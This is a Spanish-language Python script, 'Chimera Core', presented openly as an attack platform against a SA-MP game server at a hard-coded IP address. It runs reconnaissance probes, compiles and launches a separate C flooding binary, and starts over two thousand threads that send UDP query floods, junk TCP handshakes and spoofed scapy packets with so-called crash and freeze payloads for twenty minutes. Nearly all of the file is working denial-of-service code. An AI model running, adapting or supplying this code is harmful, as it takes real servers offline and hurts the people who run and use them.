#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Chimera_Core - El cerebro estratégico del ataque definitivo

import os
import sys
import time
import random
import socket
import subprocess
import threading
import requests
from scapy.all import IP, UDP, TCP, send, RandShort

# --- CONFIGURACIÓN GLOBAL ---
TARGET_DOMAIN = "tu-servidor.com"  # Dominio a analizar
TARGET_IP = "51.161.47.99"        # IP inicial (se actualizará si se encuentra la real)
TARGET_PORT = 7777
ATTACK_DURATION = 1200  # 20 minutos de aniquilación total

# --- FASE DE RECONOCIMIENTO AVANZADO ---
def advanced_reconnaissance(target_domain):
    """Busca la IP real y analiza las protecciones a un nivel más profundo."""
    print("[CHIMERA CORE] Iniciando reconocimiento avanzado...")
    real_ip = TARGET_IP  # Por defecto

    # Técnica 1: Búsqueda de DNS histórico a través de APIs públicas
    # (Esto requeriría claves API, pero es el método más efectivo)
    # Ejemplo conceptual:
    # try:
    #     response = requests.get(f"https://securitytrails.com/api/v1/history/{target_domain}/dns", headers={"APIKEY": "TU_API_KEY"})
    #     if response.status_code == 200:
    #         data = response.json()
    #         if data['records']:
    #             real_ip = data['records'][0]['ip']
    #             print(f"[CHIMERA CORE] IP real encontrada via SecurityTrails: {real_ip}")
    # except Exception as e:
    #     print(f"[CHIMERA CORE] Falló búsqueda en SecurityTrails: {e}")

    # Técnica 2: Escaneo de puertos no estándar
    print(f"[CHIMERA CORE] Analizando puertos secundarios en {TARGET_IP}...")
    common_game_ports = [7777, 7778, 7779, 7780, 27015, 27016]
    for port in common_game_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        try:
            # Paquete de query SA-MP modificado para evadir cachés
            query_packet = b"SAMP" + bytes.fromhex("".join([f"{int(b):02x}" for b in socket.inet_aton(TARGET_IP)])) + port.to_bytes(2, 'big') + b"p" # 'p' en lugar de 'i'
            sock.sendto(query_packet, (TARGET_IP, port))
            sock.recvfrom(1024)
            print(f"[CHIMERA CORE] Respuesta detectada en el puerto {port}. Posible servidor activo.")
            # Si responde, es más probable que sea la IP real del juego
            real_ip = TARGET_IP
        except socket.timeout:
            pass
        except Exception:
            pass
        sock.close()
    
    return real_ip

# --- FASE DE ANÁLISIS DE PROTECCIONES ---
def analyze_protections(target_ip, target_port):
    """Envía sondas para identificar el tipo de protección."""
    print(f"[CHIMERA CORE] Analizando el tipo de protección en {target_ip}:{target_port}...")
    try:
        # Sonda 1: Query Flood masivo y rápido para ver si se ralentiza
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start = time.time()
        for i in range(100):
            sock.sendto(b"SAMP" + os.urandom(10), (target_ip, target_port))
        sock.close()
        elapsed = time.time() - start
        if elapsed > 0.5:
            print("[CHIMERA CORE] Análisis: Posible proxy o rate-limit activo.")
            return "proxy"
        
        # Sonda 2: Paquete TCP a un puerto UDP (comportamiento anómalo)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        try:
            sock.connect((target_ip, target_port))
            print("[CHIMERA CORE] Análisis: El puerto responde a TCP. Protección débil o mal configurada.")
            sock.close()
            return "weak"
        except Exception:
            pass

    except Exception as e:
        print(f"[CHIMERA CORE] Error durante el análisis: {e}")
    
    print("[CHIMERA CORE] Análisis: El servidor no responde a sondas básicas o está protegido.")
    return "strong"

# --- DESPLIEGUE DE MÓDULOS DE ATAQUE ---
def deploy_attack_modules(target_ip, target_port, duration, protection_level):
    """Orquesta el lanzamiento de los módulos Beast y Hive."""
    print("=" * 80)
    print("CHIMERA CORE - INICIANDO SECUENCIA DE ATAQUE DEFINITIVA")
    print("=" * 80)
    print(f"Objetivo Final: {target_ip}:{target_port}")
    print(f"Duración: {duration} segundos")
    print(f"Nivel de Protección Detectado: {protection_level}")
    print("=" * 80)

    stop_event = threading.Event()
    threads = []

    # --- Despliegue del Módulo Beast (Músculo C) ---
    print("[CHIMERA CORE] Desplegando CHIMERA_BEAST (músculo de bajo nivel)...")
    try:
        # Compila el módulo C si no está compilado
        if not os.path.exists("chimera_beast"):
            print("[CHIMERA CORE] Compilando Chimera_Beast.c...")
            compile_result = subprocess.run(["gcc", "-O3", "-pthread", "chimera_beast.c", "-o", "chimera_beast"], capture_output=True, text=True)
            if compile_result.returncode != 0:
                print(f"[ERROR FATAL] Fallo al compilar Chimera_Beast.c: {compile_result.stderr}")
                sys.exit(1)
            print("[CHIMERA CORE] Chimera_Beast compilado con éxito.")
        
        # Lanza el ejecutable C con los parámetros del ataque
        beast_cmd = ["./chimera_beast", str(target_ip), str(target_port), str(duration)]
        beast_process = subprocess.Popen(beast_cmd)
        print("[CHIMERA CORE] Chimera_Beast está ejecutando el ataque de bajo nivel.")
    except Exception as e:
        print(f"[ERROR] No se pudo desplegar Chimera_Beast: {e}")

    # --- Despliegue del Módulo Hive (Enjambre de exploits) ---
    print("[CHIMERA CORE] Desplegando CHIMERA_HIVE (enjambre de exploits de aplicación)...")
    attack_functions = {
        "exploit_query_crash": 800,
        "exploit_handshake_broken": 1200,
        "exploit_raksamp_freeze": 300,
    }

    for attack_name, thread_count in attack_functions.items():
        if attack_name == "exploit_query_crash":
            target_function = lambda ip, port, dur, ev: exploit_query_crash(ip, port, dur, ev)
        elif attack_name == "exploit_handshake_broken":
            target_function = lambda ip, port, dur, ev: exploit_handshake_broken(ip, port, dur, ev)
        else: # raksamp_freeze
            target_function = lambda ip, port, dur, ev: exploit_raksamp_freeze(ip, port, dur, ev)

        print(f"[CHIMERA CORE] Lanzando {thread_count} hilos de '{attack_name}'...")
        for i in range(thread_count):
            thread = threading.Thread(target=target_function, args=(target_ip, target_port, duration, stop_event), daemon=True)
            threads.append(thread)
            thread.start()
            time.sleep(0.001)

    print(f"\n[CHIMERA CORE] Todos los módulos desplegados. El objetivo está bajo asalto total.")
    
    # --- Monitor de la Operación ---
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            time.sleep(30)
            elapsed = time.time() - start_time
            print(f"[CHIMERA CORE] Tiempo de ataque: {elapsed:.0f}s / {duration}s. Manteniendo presión.")
            if beast_process.poll() is not None:
                print("[ADVERTENCIA] El proceso Chimera_Beast ha terminado prematuramente.")
    except KeyboardInterrupt:
        print("\n[CHIMERA CORE] Abortando operación por comando del usuario.")
    finally:
        print("[CHIMERA CORE] Deteniendo todos los módulos...")
        stop_event.set()
        beast_process.terminate()
        time.sleep(5)
        print("[CHIMERA CORE] Operación Chimera finalizada.")

# --- Funciones de Explotación (reutilizadas y optimizadas) ---
def exploit_query_crash(target_ip, target_port, duration, stop_event):
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            query_base = b"SAMP" + bytes.fromhex("".join([f"{int(b):02x}" for b in socket.inet_aton(target_ip)])) + target_port.to_bytes(2, 'big')
            malicious_payload = os.urandom(random.randint(100, 300)) # Payload más grande
            full_packet = query_base + malicious_payload
            sock.sendto(full_packet, (target_ip, target_port))
            time.sleep(0.005) # Más rápido
        except Exception:
            pass
    sock.close()

def exploit_handshake_broken(target_ip, target_port, duration, stop_event):
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2) # Timeout más corto
            sock.connect((target_ip, target_port))
            sock.send(b"\xFF\xFF\x00" + os.urandom(random.randint(20, 150))) # Payload más grande
            sock.close()
        except Exception:
            pass
        time.sleep(random.uniform(0.01, 0.1)) # Más rápido

def exploit_raksamp_freeze(target_ip, target_port, duration, stop_event):
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            rpc_crash_payload = b'\xC7' + b'!freeze' + os.urandom(200) # Payload más grande
            packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / rpc_crash_payload
            send(packet, verbose=False, loop=0)
            time.sleep(0.05)
        except Exception:
            pass

# --- FUNCIÓN PRINCIPAL ---
def main():
    print("=" * 80)
    print("     PROYECTO CHIMERA - ECOSISTEMA DE ATAQUE DEFINITIVO")
    print("Este no es un script. Es una plataforma de ataque modular.")
    print("=" * 80)

    if os.geteuid() != 0:
        print("[ERROR CRÍTICO] Ejecuta como root (sudo).")
        sys.exit(1)
        
    # Fase 1: Reconocimiento
    real_ip = advanced_reconnaissance(TARGET_DOMAIN)
    
    # Fase 2: Análisis
    protection_level = analyze_protections(real_ip, TARGET_PORT)
    
    # Fase 3: Despliegue del ataque
    deploy_attack_modules(real_ip, TARGET_PORT, ATTACK_DURATION, protection_level)

if __name__ == "__main__":
    main()
